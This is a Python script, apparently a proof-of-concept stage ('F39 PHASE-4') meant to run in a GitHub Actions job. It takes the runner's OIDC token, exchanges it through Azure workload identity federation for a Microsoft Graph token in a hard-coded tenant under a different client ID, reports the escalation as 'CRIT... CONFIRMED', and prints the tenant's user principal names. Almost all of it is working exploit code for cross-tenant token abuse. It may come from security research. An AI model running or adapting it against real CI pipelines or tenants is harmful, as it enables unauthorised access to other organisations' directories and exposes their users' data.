import os, json, base64, urllib.request, urllib.parse, urllib.error
T1_TENANT    = "3f5c2342-5a70-49d9-a1b6-971a500d3fd0"
T2_CLIENT_ID = "74f5d984-cb89-458e-ac75-ad84eaa44425"
print("=== F39 PHASE-4: GitHub OIDC -> T1 WIF Exchange ===")
req_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api://AzureADTokenExchange"
req_tok = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
r = urllib.request.urlopen(urllib.request.Request(req_url,
    headers={"Authorization": f"bearer {req_tok}"}), timeout=30)
oidc_tok = json.loads(r.read())["value"]
parts = oidc_tok.split("."); pad = "=" * (-len(parts[1]) % 4)
oidc_pay = json.loads(base64.b64decode(parts[1] + pad))
print(f"OIDC.iss={oidc_pay.get('iss')}  sub={oidc_pay.get('sub')}")
data = urllib.parse.urlencode({
    "grant_type": "client_credentials",
    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
    "client_assertion": oidc_tok,
    "client_id": T2_CLIENT_ID,
    "scope": "https://graph.microsoft.com/.default",
}).encode()
req2 = urllib.request.Request(
    f"https://login.microsoftonline.com/{T1_TENANT}/oauth2/v2.0/token",
    data=data, method="POST",
    headers={"Content-Type": "application/x-www-form-urlencoded"})
try:
    resp2 = urllib.request.urlopen(req2, timeout=30)
    result = json.loads(resp2.read()); at = result["access_token"]
    parts2 = at.split("."); pad2 = "=" * (-len(parts2[1]) % 4)
    pay2 = json.loads(base64.b64decode(parts2[1] + pad2))
    appid = pay2.get("appid","?"); tid = pay2.get("tid","?"); roles = pay2.get("roles",[])
    print("*** CRIT PHASE-4: WIF EXCHANGE HTTP 200 -- PR:N CONFIRMED")
    print(f"JWT.appid={appid}  tid={tid}  roles_count={len(roles)}")
    if appid != T2_CLIENT_ID:
        print(f"SCOPE_CHANGED=TRUE  appid={appid} != T2={T2_CLIENT_ID}")
    req3 = urllib.request.Request("https://graph.microsoft.com/v1.0/users?$select=userPrincipalName",
        headers={"Authorization": f"Bearer {at}"})
    resp3 = urllib.request.urlopen(req3, timeout=30)
    users = json.loads(resp3.read()).get("value",[])
    print(f"C:H_CONFIRMED: GET /users HTTP 200 count={len(users)}")
    for u in users: print(f"  UPN: {u.get('userPrincipalName')}")
except urllib.error.HTTPError as e:
    print(f"*** WIF EXCHANGE HTTP {e.code} FAILED: {e.read().decode()[:500]}")
